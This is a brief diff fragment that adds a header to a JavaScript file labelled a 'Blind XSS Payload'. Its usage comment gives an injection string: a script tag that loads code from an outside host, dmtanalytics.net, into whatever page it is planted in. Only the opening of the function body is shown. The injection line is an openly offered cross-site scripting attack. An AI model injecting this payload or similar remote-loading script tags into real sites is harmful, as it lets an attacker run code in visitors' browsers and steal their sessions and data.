@@ -1,3 +1,5 @@
+// Blind XSS Payload
+// Usage: <script src="https://dmtanalytics.net/t"></script>
 
 (function () {
   'use strict';
